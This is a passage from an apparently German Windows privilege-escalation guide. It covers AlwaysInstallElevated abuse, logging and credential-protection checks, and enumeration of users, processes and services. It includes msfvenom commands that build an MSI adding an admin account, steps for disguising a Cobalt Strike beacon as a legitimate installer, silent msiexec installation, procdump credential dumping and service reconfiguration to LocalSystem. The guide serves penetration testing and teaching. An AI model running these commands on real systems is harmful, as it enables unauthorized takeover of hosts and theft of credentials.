Weitere Informationen zum Ablauf des Angriffs findest du unter [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Wenn** diese 2 Registrierungsschlüssel **aktiviert** sind (Wert **0x1**), können Benutzer mit beliebigen Berechtigungen `*.msi`-Dateien als NT AUTHORITY\\**SYSTEM** **installieren** (ausführen).

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Wenn du über eine meterpreter session verfügst, kannst du diese Technik mit dem Modul **`exploit/windows/local/always_install_elevated`** automatisieren.

### PowerUP

Verwende den Befehl `Write-UserAddMSI` von power-up, um im aktuellen Verzeichnis eine Windows-MSI-Binärdatei zur Rechteausweitung zu erstellen. Dieses Skript schreibt ein vorkompiliertes MSI-Installationsprogramm, das zur Benutzer-/Gruppenhinzufügung auffordert (du benötigst also GIU-Zugriff):

```
Write-UserAddMSI
```

Führe einfach die erstellte Binärdatei aus, um deine Berechtigungen zu erweitern.

### MSI Wrapper

Lies dieses Tutorial, um zu erfahren, wie du mit diesem Tool einen MSI Wrapper erstellst. Beachte, dass du eine „**.bat**“-Datei verpacken kannst, wenn du **nur** **Befehlszeilen ausführen** möchtest.


{{#ref}}
msi-wrapper.md
{{#endref}}

### MSI mit WIX erstellen


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### MSI mit Visual Studio erstellen

- Erzeuge mit Cobalt Strike oder Metasploit eine **neue Windows-EXE-TCP-Payload** unter `C:\privesc\beacon.exe`
- Öffne **Visual Studio**, wähle **Create a new project** und gib „installer“ in das Suchfeld ein. Wähle das Projekt **Setup Wizard** aus und klicke auf **Next**.
- Gib dem Projekt einen Namen, zum Beispiel **AlwaysPrivesc**, verwende **`C:\privesc`** als Speicherort, wähle **place solution and project in the same directory** aus und klicke auf **Create**.
- Klicke weiter auf **Next**, bis du Schritt 3 von 4 erreichst (Dateien zum Einschließen auswählen). Klicke auf **Add** und wähle die soeben erzeugte Beacon-Payload aus. Klicke anschließend auf **Finish**.
- Markiere das Projekt **AlwaysPrivesc** im **Solution Explorer** und ändere in den **Properties** den Wert von **TargetPlatform** von **x86** zu **x64**.
  - Du kannst auch andere Eigenschaften ändern, etwa **Author** und **Manufacturer**, damit die installierte App legitimer wirkt.
- Klicke mit der rechten Maustaste auf das Projekt und wähle **View > Custom Actions**.
- Klicke mit der rechten Maustaste auf **Install** und wähle **Add Custom Action**.
- Doppelklicke auf **Application Folder**, wähle die Datei **beacon.exe** aus und klicke auf **OK**. Dadurch wird sichergestellt, dass die Beacon-Payload ausgeführt wird, sobald der Installer gestartet wird.
- Ändere unter **Custom Action Properties** den Wert von **Run64Bit** zu **True**.
- Zum Schluss **erstelle den Build**.
  - Wenn die Warnung `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` angezeigt wird, stelle sicher, dass du die Plattform auf x64 gesetzt hast.

### MSI-Installation

So führst du die **Installation** der schädlichen `.msi`-Datei im **Hintergrund** aus:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Um diese Schwachstelle auszunutzen, kannst du Folgendes verwenden: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Überwachungseinstellungen

Diese Einstellungen legen fest, was **protokolliert** wird. Daher solltest du darauf achten.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding: Es ist interessant zu wissen, wohin die Protokolle gesendet werden.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** wurde für die **Verwaltung lokaler Administratorpasswörter** entwickelt und stellt sicher, dass jedes Passwort auf in eine Domäne eingebundenen Computern **einzigartig, zufällig generiert und regelmäßig aktualisiert** wird. Diese Passwörter werden sicher in Active Directory gespeichert und können nur von Benutzern aufgerufen werden, denen über ACLs ausreichende Berechtigungen erteilt wurden. Dadurch können sie lokale Administratorpasswörter einsehen, sofern sie dazu berechtigt sind.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Wenn aktiv, werden **Klartextpasswörter in LSASS** (Local Security Authority Subsystem Service) gespeichert.\
[**Weitere Informationen zu WDigest auf dieser Seite**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA-Schutz

Ab **Windows 8.1** führte Microsoft einen erweiterten Schutz für die lokale Sicherheitsautorität (LSA) ein, um Versuche nicht vertrauenswürdiger Prozesse zu **blockieren**, **ihren Speicher auszulesen** oder Code einzuschleusen und so das System besser abzusichern.\
[**Weitere Informationen zum LSA-Schutz hier**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** wurde in **Windows 10** eingeführt. Es soll auf einem Gerät gespeicherte Anmeldedaten vor Bedrohungen wie Pass-the-Hash-Angriffen schützen. [**Weitere Informationen zu Credential Guard finden Sie hier.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Zwischengespeicherte Anmeldedaten

**Domänenanmeldedaten** werden von der **Local Security Authority** (LSA) authentifiziert und von Betriebssystemkomponenten verwendet. Wenn die Anmeldedaten eines Benutzers beim Anmelden von einem registrierten Sicherheitspaket authentifiziert werden, werden für diesen Benutzer in der Regel Domänenanmeldedaten eingerichtet.\
[**Weitere Informationen zu zwischengespeicherten Anmeldedaten**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Benutzer und Gruppen

### Benutzer und Gruppen auflisten

Du solltest prüfen, ob eine der Gruppen, denen du angehörst, interessante Berechtigungen hat.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Privilegierte Gruppen

Wenn Sie **einer privilegierten Gruppe angehören, können Sie möglicherweise Ihre Rechte erweitern**. Erfahren Sie hier mehr über privilegierte Gruppen und wie Sie sie zur Rechteausweitung missbrauchen können:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token-Manipulation

**Erfahren Sie mehr** darüber, was ein **Token** ist, auf dieser Seite: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Sehen Sie sich die folgende Seite an, um **mehr über interessante Tokens** und deren Missbrauch zu erfahren:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Angemeldete Benutzer / Sitzungen

```bash
qwinsta
klist sessions
```

### Home-Verzeichnisse

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Kennwortrichtlinie

```bash
net accounts
```

### Inhalt der Zwischenablage abrufen

```bash
powershell -command "Get-Clipboard"
```

## Laufende Prozesse

### Datei- und Ordnerberechtigungen

Durchsuche beim Auflisten der Prozesse zuerst die Befehlszeilen der Prozesse nach Passwörtern.\
Prüfe, ob du eine laufende Binärdatei **überschreiben** kannst oder Schreibberechtigungen für den Ordner der Binärdatei hast, um mögliche [**DLL Hijacking attacks**](dll-hijacking/index.html) auszunutzen:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Prüfe immer, ob [**electron/cef/chromium-Debugger** laufen; du könntest sie missbrauchen, um deine Berechtigungen zu erweitern](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Ein Debugger-Listener kann nur kurzzeitig aktiv sein. Dass er in einer einzelnen passiven Portaufnahme nicht zu sehen ist, beweist daher nicht, dass er nie erreichbar war. Ordne jeden beobachteten Listener seiner PID und dem Prozesseigentümer zu und prüfe, ob der Benutzer mit geringeren Berechtigungen ihn erreichen kann. Der Anwendungsname oder ein Debug-Flag allein belegt keine Codeausführung benutzerübergreifend. Führe die routinemäßige Enumeration passiv durch und sende keine Debugger-Befehle.

**Berechtigungen der Prozess-Binärdateien prüfen**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Berechtigungen der Ordner der Prozess-Binärdateien prüfen (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort-Verzeichnisse für dynamische Präprozessoren

Snort 2 kann gemeinsame Bibliotheken aus einem `dynamicpreprocessor directory` laden, das in der mit `snort.exe -c <config>` ausgewählten Konfiguration angegeben ist. Prüfe bei einer geplanten Aufgabe oder einem Dienst, der Snort unter einem anderen Konto ausführt, genau diese Konfiguration und die ACL des angegebenen Modulverzeichnisses. Wenn dein Token dort Dateien erstellen kann, ist der Pfad ein Kandidat für eine Überprüfung auf Codeausführung, wenn die Aufgabe oder der Dienst das nächste Mal Module lädt. Überprüfe die effektiven Berechtigungen des Run-as-Kontos, die aktive Konfiguration, die Modulkompatibilität sowie etwaige Verweigerungs- oder Freigabebeschränkungen; ein beschreibbares Verzeichnis allein belegt keine Rechteausweitung. Die [Dokumentation zu Snorts dynamischen Präprozessoren](https://www.snort.org/documents/dpx-readme) beschreibt das Laden von Modulen zur Laufzeit.

### Privilegierter Webdienst mit beschreibbarem DocumentRoot

Vergleiche bei einer Windows-Apache-Installation den Pfad zur ausführbaren Datei des Dienstes und das Run-as-Konto mit dem `DocumentRoot` in der aktiven `httpd.conf`. Prüfe bei einem üblichen XAMPP-Layout `C:\xampp\apache\conf\httpd.conf` und die ACL des darin konfigurierten Dokumentenstamms, häufig `C:\xampp\htdocs`. Wenn ein Benutzer mit geringeren Berechtigungen in diesem Verzeichnis Dateien erstellen kann, während Apache als `LocalSystem` ausgeführt wird, kann serverseitige Codeausführung die Privilegiengrenze des Hosts überschreiten. Vergewissere dich, dass der Dienst läuft, der genaue Pfad ausgeliefert wird und ein serverseitiger Handler den Dateityp verarbeitet; ein beschreibbarer Stammordner belegt für sich genommen nur die Möglichkeit, Dateien zu erstellen. Prüfe ACLs, ohne eine Testdatei zu schreiben:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Bei einer herkömmlichen WAMP-Installation kann der Dienst auf eine versionierte `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (oder bei einem 32-Bit-Layout auf `C:\wamp\...`) verweisen. Die Konfiguration befindet sich daneben unter `conf\httpd.conf`, und das Standardstammverzeichnis ist `C:\wamp64\www` oder `C:\wamp\www`. Prüfen Sie gemeinsam den genauen Dienstpfad, die Identität, unter der der Dienst ausgeführt wird, den effektiven `DocumentRoot` (einschließlich der Expansion von `${INSTALL_DIR}` und etwaiger Virtual-Host-Überschreibungen) sowie die ACL des Stammverzeichnisses. Ein beschreibbares WAMP-Verzeichnis belegt weder, dass Apache als `SYSTEM` ausgeführt wird, noch, dass die bereitgestellte Datei ausgeführt wird. [Apache dokumentiert, wie ein Windows-Dienst seine Konfiguration auswählt](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Beschreibbares IIS-Stammverzeichnis und Netzwerkidentität des Anwendungspools

Ordnen Sie bei IIS ein beschreibbares physisches Verzeichnis in `applicationHost.config` einer **aktiven Site/Anwendung** zu und ermitteln Sie anschließend den konfigurierten Pool und den serverseitigen Handler. Im bereitgestellten Verzeichnis abgelegter Code wird nur dann als Pool ausgeführt, wenn IIS diesen Dateityp verarbeitet und die Route erreichbar ist. Prüfen Sie die effektiven Berechtigungen des aktuellen Benutzers zum Erstellen von Dateien, den Laufzeitstatus der Site, den Handler und pfadspezifische Überschreibungen, bevor Sie ein beschreibbares Verzeichnis als Möglichkeit zur Codeausführung einstufen.

Die dynamische ASP.NET-Kompilierung eröffnet einen separaten Prüfpfad: generierte Dateien im Kompilierungsverzeichnis der Anwendung. Standardmäßig ist dies ein Verzeichnis namens `Temporary ASP.NET Files` unterhalb der relevanten .NET-Framework-Installation; `<compilation tempDirectory>` der Anwendung kann diesen Pfad jedoch ändern. [Microsoft dokumentiert den Speicherort und die anwendungsspezifischen Unterverzeichnisse](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) und [empfiehlt, Kompilierungsverzeichnisse zu isolieren, wenn Anwendungspools einander nicht vertrauen](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Kann ein Token mit niedrigeren Berechtigungen den generierten Quellcode im Cache der **konkreten** Anwendung ändern, ermitteln Sie, ob diese Anwendung ihn unter einer höher privilegierten [Workerprozessidentität](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) erneut kompiliert. Eine Datei- oder Verzeichnis-ACL allein beweist keine Codeausführung: Ordnen Sie den Cache der aktiven Anwendung, dem effektiven Token und der ACL, den Kompilierungseinstellungen, der Prozessidentität und dem Zeitpunkt einer etwaigen Neukompilierung zu. Prüfen Sie Metadaten schreibgeschützt; lösen Sie während der Bestandsaufnahme keine Kompilierung aus und ändern Sie keine Cache-Dateien.

Ein IIS-Pool, der als `ApplicationPoolIdentity` oder `NetworkService` konfiguriert ist, authentifiziert sich bei Domänenressourcen üblicherweise als **Computerkonto des Hosts**, auch wenn sein lokales Token nur geringe Berechtigungen hat. `LocalSystem` verfügt lokal bereits über weitreichende Berechtigungen und verwendet im Netzwerk ebenfalls das Computerkonto; `LocalService` verwendet normalerweise anonyme Netzwerk-Anmeldedaten. Ein Pool mit `SpecificUser` verwendet stattdessen das konfigurierte Konto. [Microsoft dokumentiert diese Identitätstypen](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) und [die Netzwerkidentität von Anwendungspools](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Eine nicht angegebene Identitätseinstellung kann die Pool-Standardeinstellungen übernehmen, die sich je nach IIS-Version unterscheiden. Ermitteln Sie daher die effektive Konfiguration, statt anhand des Poolnamens zu raten. Erreicht die Codeausführung einen Pool mit der Netzwerkidentität eines Computerkontos, prüfen Sie die Verzeichnisrechte **dieses konkreten Computers**. [DCSync](../active-directory-methodology/dcsync.md) erfordert Replikationsrechte auf dem Domänen-Namenskontext; ein Ticket für ein Computerkonto oder eine Hostrolle allein belegt diese Rechte nicht. Eine passive Bestandsaufnahme sollte Konfiguration und ACLs prüfen, ohne Dateien hochzuladen, eine Netzwerkauthentifizierung auszulösen oder Tickets anzufordern.

Bei einem lesbaren ASP.NET-Handler, der einen Hilfsprozess startet, verfolgen Sie jeden aus einer Anfrage stammenden Wert durch Authentifizierung, Entschlüsselung, Validierung und Befehlserstellung. Ein Handler, der ein dekodiertes Token mit `ProcessStartInfo("cmd", "/c ...")` verkettet, kann es Shell-Metazeichen ermöglichen, den Befehl zu ändern; [Microsoft dokumentiert die Sonderzeichen von `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Stellen Sie fest, ob ein nicht vertrauenswürdiger Aufrufer den dekodierten Wert tatsächlich beeinflussen und den Handler erreichen kann. Ermitteln Sie außerdem die effektive Identität des Anwendungspools oder die Identität während der Identitätsübernahme sowie die Identität des untergeordneten Prozesses. Eine lesbare Quellcodezeile, ein Listener auf localhost oder eine Schwachstelle im Token-Format allein belegen keine privilegierte Befehlsausführung. Prüfen Sie Quellcode und Poolkonfiguration, ohne während einer passiven Bestandsaufnahme gefälschte Anfragen zu senden oder den Hilfsprozess auszuführen.

Bei einem PHP-Dienst unter Windows kann ein vom Request kontrollierter Pfad, der an [`include` oder `require`](https://www.php.net/manual/en/function.include.php) übergeben wird, eine PHP-Datei auswerten, die ein Benutzer mit geringeren Berechtigungen ändern kann, und zwar mit der Identität des Workers. Bestätigen Sie, dass die Anfrage diese Anweisung erreichen kann, der aufgelöste Pfad auf eine Datei verweist, die der Benutzer mit geringeren Berechtigungen ändern und der Worker lesen kann, geltende PHP-Pfadbeschränkungen das Include zulassen und der Worker tatsächlich mit höheren Berechtigungen ausgeführt wird. Ein Listener auf Loopback oder eine beschreibbare Datei allein belegt diese Angriffskette nicht. Prüfen Sie Quellcode, Dienstidentität und Datei-ACLs, ohne den Endpunkt während einer passiven Bestandsaufnahme aufzurufen.

### Passwortsuche im Arbeitsspeicher

Mit **procdump** von Sysinternals können Sie einen Speicherauszug eines laufenden Prozesses erstellen. Dienste wie FTP haben **Anmeldedaten im Klartext im Arbeitsspeicher**. Versuchen Sie, den Speicher auszulesen und die Anmeldedaten zu finden.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Unsichere GUI-Apps

**Anwendungen, die als SYSTEM ausgeführt werden, können es einem Benutzer ermöglichen, eine CMD zu starten oder Verzeichnisse zu durchsuchen.**

Beispiel: „Windows-Hilfe und Support“ (Windows + F1), nach „Eingabeaufforderung“ suchen und auf „Klicken Sie hier, um die Eingabeaufforderung zu öffnen“ klicken

### Import von Projektdateien mit erhöhten Rechten

Eine Anwendung, die Projekte automatisch aus einem Drop-Verzeichnis öffnet, in das ein Benutzer mit niedrigeren Rechten schreiben kann, überschreitet beim Import unter dem Konto des Importers eine Vertrauensgrenze für Eingaben. Prüfen Sie den **genauen beschreibbaren Pfad**, den Prozess oder die Aufgabe, die ihn öffnet, dessen effektive Identität und den Parser-Build. Ein [historisches Problem beim Öffnen/Wiederherstellen von Ghidra-Projekten](https://github.com/NationalSecurityAgency/ghidra/issues/71) ermöglichte XML External Entities in Projektmetadaten; eine Netzwerk-Entity unter Windows konnte eine Authentifizierung durch das importierende Konto auslösen, sofern die [Richtlinien für ausgehendes SMB und NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) dies erlauben. Das ist ein Hinweis auf mögliche Offenlegung von Zugangsdaten, kein unmittelbarer Administratorzugriff: Die Antwort muss über einen separaten autorisierten oder verwundbaren Pfad nutzbar sein, und aktuelle Builds müssen anhand ihres tatsächlichen Patch-Status bewertet werden. Öffnen Sie bei der passiven Enumeration kein präpariertes Projekt; prüfen Sie den Import-Workflow und die ACLs.

## Dienste

Das Recht [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) für das Service Control Manager (SCM)-Objekt ist von den Rechten für einen bestehenden Dienst getrennt. Eine erfolgreiche schreibgeschützte [`OpenSCManager`-Zugriffsanforderung](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) für dieses Recht ist ein Prüfhinweis, aber kein Beweis dafür, dass ein neuer Dienst ausgeführt werden kann. [`CreateService` gibt ein Handle zurück](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew), das die beim Erstellen angeforderten Dienstzugriffsrechte besitzt; ein späteres erneutes Öffnen des Dienstes führt eine separate Zugriffskontrolle durch und kann fehlschlagen, selbst wenn das ursprüngliche Handle verwendet werden könnte. Prüfen Sie separat das effektive lokale oder Remote-Token, die gewährten Handle-Rechte, das Dienstkonto, die Start-Richtlinie und den ausführbaren Pfad. Erstellen oder starten Sie während der passiven Enumeration keinen Dienst.

Ordnen Sie bei einem Remote-Pfad zur Dienstinstallation diese SCM-Rechte einer Freigabe auf dem Ziel zu, in die derselbe Netzwerk-Logon schreiben kann, sowie deren zugrunde liegender NTFS-ACL und einem lokalen ausführbaren Pfad, den das Dienstkonto ausführen kann. Ein Nicht-Admin-Konto kann diese Grenze überschreiten, wenn ungewöhnlich weitreichende SCM-Rechte und ein Pfad zum Platzieren der Datei vorhanden sind; eine administrative Freigabe ist keine zwingende Voraussetzung. Schreibzugriff auf eine Freigabe allein oder ein Hinweis auf das Recht zum Erstellen eines Dienstes allein belegen nicht, dass der neue Dienst mit einer höheren Identität gestartet werden kann.

Ein bestehender Dienst kann beim Start, beim Herunterfahren oder bei einem anderen Lebenszyklusereignis eine Hilfsdatei aufrufen, auch wenn diese nicht in seinem `ImagePath` aufgeführt ist. Wird der Name der Hilfsdatei in ein Verzeichnis aufgelöst, in das ein Benutzer mit niedrigeren Rechten schreiben kann, und läuft der Dienst mit einer höheren Identität, ist eine fehlende Hilfsdatei ein bedingter Kandidat für einen Austausch. Bestätigen Sie den **tatsächlichen Dienstcode oder den dokumentierten Aufruf der Hilfsdatei**, den aufgelösten ausführbaren Pfad und die Suchreihenfolge, die Berechtigungen zum Erstellen des Verzeichnisses, die Dienstidentität und einen verfügbaren Auslöser für den Lebenszyklus. Ein beschreibbares Dienstverzeichnis oder eine fehlende Datei allein belegt nicht, dass der Dienst die Datei lädt; die passive Prüfung sollte den Dienst weder starten noch stoppen.

Für einen bestehenden Dienst gilt: [`SERVICE_START` erlaubt die Übergabe von Argumenten an `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); dieses Recht ist von [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) getrennt. Prüfen Sie den Code oder die dokumentierte Schnittstelle des Dienstes, bevor Sie das Startrecht als mehr als ein Steuerungsrecht einstufen. Wenn der Dienst ein vom Aufrufer gewähltes Argument als Protokoll- oder Exportpfad verwendet, überprüfen Sie die Dienstidentität, den genauen Ablauf von Argument zu Schreibvorgang, Pfadbeschränkungen und die Berechtigungen der **erstellten Datei**. Ein Schreibvorgang in ein geschütztes Verzeichnis kann nur dann zur Rechteausweitung führen, wenn ein separater privilegierter Verbraucher oder Loader diese Datei akzeptiert; ein beschreibbares Protokoll oder das Startrecht allein reicht nicht aus. Die passive Bestandsaufnahme sollte den Dienst nicht starten und keine Testdatei erstellen.

Bei einem NSClient++-Überwachungsagenten ist eine lesbare `nsclient.ini` ein **Hinweis für eine Konfigurationsprüfung**: Sie kann Web-Zugangsdaten enthalten, während `boot.ini` die Konfiguration an einen anderen Speicherort umleiten kann. Prüfen Sie das tatsächliche Dienstkonto, den WEB-Listener und die Zugriffsrichtlinie sowie, ob die authentifizierte Rolle Einstellungen oder Skripte ändern kann. Eine privilegierte Ausführung erfordert zusätzlich `CheckExternalScripts` (oder einen anderen aktivierten Ausführungspfad), ein tatsächlich gewährtes Recht zum Registrieren oder Ändern eines Befehls und einen Auslöser, der ihn unter der Dienstidentität ausführt. Ein Listener, der nur an Loopback gebunden ist, kann für einen lokalen Benutzer dennoch erreichbar sein, aber der Dateipfad, das Passwort oder der Listener allein belegen diese Rechte nicht. Prüfen Sie Metadaten und Berechtigungen, ohne bei der passiven Enumeration Geheimnisse anzuzeigen oder die Web-API aufzurufen. Siehe [NSClient++-Dateiaufbau](https://nsclient.org/docs/concepts/file-layout/), [Sicherheitshinweise zu Web und Skripten](https://nsclient.org/docs/setup/securing/) und [Konfiguration externer Skripte](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Bei einem Dienst mit `nssm.exe` als `ImagePath` prüfen Sie das tatsächliche Ausführungskonto des Dienstes und dessen Wert `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM speichert dort die untergeordnete Anwendung](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), während `AppDirectory` das konfigurierte Arbeitsverzeichnis ist. Prüfen Sie die untergeordnete ausführbare Datei und die ACLs ihrer übergeordneten Verzeichnisse, bevor Sie die Berechtigungen des Wrappers als gesamte Dienstgrenze betrachten. Ein lokaler WCF- oder SOAP-Endpunkt, der von dieser untergeordneten Anwendung bereitgestellt wird, ist ein separater Prüfhinweis: Bestätigen Sie, dass der Listener für den Benutzer mit niedrigeren Rechten erreichbar ist, dass die konkrete Operation dessen Eingabe akzeptiert und dass die untergeordnete Dienstanwendung den unsicheren Vorgang mit einer höheren Identität ausführt. Das Dienstkonto, eine Endpunkt-URL oder ein beschreibbarer Pfad allein beweisen keine Rechteausweitung; rufen Sie bei der passiven Enumeration keine Dienstoperationen auf.

Verfolgen Sie bei einer benutzerdefinierten WCF-Operation eine vom Aufrufer kontrollierte Zeichenfolge bis in einen PowerShell-Runspace. [`Pipeline.Commands.AddScript` fügt Skripttext hinzu](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), und [`Pipeline.Invoke` führt die Pipeline aus](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). Eine [`netTcpBinding` mit Windows-Transportanmeldeinformationen](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) authentifiziert den Client, aber die Berechtigung zum Aufrufen genau dieser Operation und die effektive Identität des Runspaces müssen separat geprüft werden. Ein Pfad von einer Eingabe eines Aufrufers mit niedrigeren Rechten zu `AddScript`, das unter einer höheren Dienstidentität ausgeführt wird, bildet eine Codeausführungsgrenze; ein lauschender Port, ein authentifizierter Client oder eine ungenutzte Methode in einer nicht zugehörigen Assembly allein ist kein Beweis. Prüfen Sie den bereitgestellten Dienst, den Contract sowie die Autorisierungs- und Impersonation-Einstellungen statisch, ohne den Endpunkt während der Enumeration aufzurufen.

Service Triggers ermöglichen es Windows, einen Dienst bei bestimmten Ereignissen zu starten (Aktivität an Named Pipes/RPC-Endpunkten, ETW-Ereignisse, verfügbare IP-Adresse, Geräteanschluss, GPO-Aktualisierung usw.). Selbst ohne SERVICE_START-Rechte können Sie privilegierte Dienste oft durch Auslösen ihrer Trigger starten. Siehe Enumeration und Aktivierungstechniken hier:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio Diagnostic Collector Service

Visual Studio-Installationen mit C/C++-Tools können `VSStandardCollectorService150` enthalten, einen Diagnose-Dienst, der so konfiguriert ist, dass er als `LocalSystem` ausgeführt wird. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) nutzte eine Junction und eine Race Condition mit einem Object-Manager-Link, um eine DACL-Zurücksetzung des Dienstes umzuleiten. Die demonstrierte Rechteausweitung erforderte außerdem einen nutzbaren MSI-Reparaturpfad des Visual Studio Setup WMI Provider und dessen Ziel `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Die Komponente wurde im Januar 2024 korrigiert.

Prüfen Sie bei der passiven Triage das Konto und den Binärpfad dieses Dienstes, ob der Setup-WMI-Compilerpfad vorhanden ist, und den Patch-Status der installierten Komponente. Ein Diensteintrag, eine Visual-Studio-Produktversion oder eine Compilerdatei allein belegt nicht, dass der Host verwundbar ist. Für die Prüfung muss der Dienst weder gestartet noch eine Reparatur ausgeführt werden.

Rufen Sie eine Liste der Dienste ab:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Berechtigungen

Mit **sc** kannst du Informationen zu einem Dienst abrufen.

```bash
sc qc <service_name>
```

Es wird empfohlen, die Binärdatei **accesschk** von _Sysinternals_ zu verwenden, um die erforderliche Berechtigungsstufe für jeden Dienst zu überprüfen.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Es wird empfohlen zu prüfen, ob "Authenticated Users" einen Dienst ändern können:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Du kannst accesschk.exe für XP hier herunterladen](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Dienst aktivieren

Wenn dieser Fehler auftritt (zum Beispiel bei SSDPSRV):

_Systemfehler 1058 ist aufgetreten._\
_Der Dienst kann nicht gestartet werden, weil er deaktiviert ist oder keine aktivierten Geräte mit ihm verknüpft sind._

Du kannst ihn aktivieren mit

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

